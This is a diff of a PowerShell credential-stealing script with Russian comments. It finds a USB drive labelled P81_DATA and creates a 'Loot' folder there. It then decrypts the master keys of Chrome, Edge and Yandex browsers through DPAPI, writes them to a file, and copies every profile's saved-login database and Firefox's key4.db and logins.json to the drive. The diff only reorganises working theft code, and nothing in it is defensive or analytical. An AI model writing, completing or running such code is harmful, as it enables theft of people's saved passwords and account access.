@@ -3,7 +3,7 @@ $u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
 if (!$u) { exit }
 $usb = "$($u):"
 
-# 2. Создание папки с временной меткой
+# 2. Создание папки с уникальной меткой времени
 $dest = "$usb\Loot_$(Get-Date -f mmss)"
 mkdir $dest -Force | Out-Null
 
@@ -11,7 +11,7 @@ mkdir $dest -Force | Out-Null
 Add-Type -AssemblyName System.Security
 $report = "$dest\KEYS.txt"
 
-# Список браузеров для обработки
+# Список путей для Chrome, Edge и Яндекса
 $browsers = @(
     @{n="Chrome"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
     @{n="Edge"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
@@ -20,36 +20,42 @@ $browsers = @(
 
 foreach ($b in $browsers) {
     $path = $b.p
-    $ls = "$path\Local State"
-    if (Test-Path $ls) {
-        try {
-            # Извлекаем мастер-ключ
-            $json = Get-Content $ls -Raw | ConvertFrom-Json
-            $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-            $unp = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
-            
-            # Пишем в отчет, чей это ключ
-            "[$($b.n)] Master Key: $([Convert]::ToBase64String($unp))" >> $report
-            
-            # 4. Копирование баз с четкими подписями
-            Get-ChildItem -Path $path -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
-                # Формируем имя: Браузер_Профиль.db (например, Chrome_Default.db)
-                $profile = $_.Directory.Name
-                $targetName = "$($b.n)_$($profile).db"
-                Copy-Item $_.FullName -Destination "$dest\$targetName" -Force
-            }
-        } catch {}
+    if (Test-Path $path) {
+        # Извлекаем мастер-ключ для этого браузера
+        $ls = "$path\Local State"
+        if (Test-Path $ls) {
+            try {
+                $json = Get-Content $ls -Raw | ConvertFrom-Json
+                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+                $unp = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
+                "[$($b.n)] Master Key: $([Convert]::ToBase64String($unp))" >> $report
+            } catch {}
+        }
+
+        # Копируем базы Login Data из всех профилей
+        Get-ChildItem -Path $path -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
+            $profile = $_.Directory.Name
+            # Имя файла на флешке: Браузер_Профиль_LoginData.db
+            $targetName = "$($b.n)_$($profile)_LoginData.db"
+            Copy-Item $_.FullName -Destination "$dest\$targetName" -Force
+        }
     }
 }
 
-# 5. Сбор Firefox
-$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
-if (Test-Path $ff) {
-    Get-ChildItem $ff -Directory | ForEach-Object {
-        $n = $_.Name # Имя профиля Firefox
-        # Копируем с префиксом браузера и профиля
-        Copy-Item "$($_.FullName)\key4.db" -Destination "$dest\FF_$($n)_key4.db" -Force -ErrorAction SilentlyContinue
-        Copy-Item "$($_.FullName)\logins.json" -Destination "$dest\FF_$($n)_logins.json" -Force -ErrorAction SilentlyContinue
+# 4. Сбор данных Firefox
+$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $ffPath) {
+    Get-ChildItem $ffPath -Directory | ForEach-Object {
+        $pName = $_.Name
+        $files = @("key4.db", "logins.json")
+        foreach ($f in $files) {
+            $src = Join-Path $_.FullName $f
+            if (Test-Path $src) {
+                # Имя файла на флешке: FF_ИмяПрофиля_названиефайла
+                $target = "FF_$($pName)_$f"
+                Copy-Item $src -Destination "$dest\$target" -Force
+            }
+        }
     }
 }
 
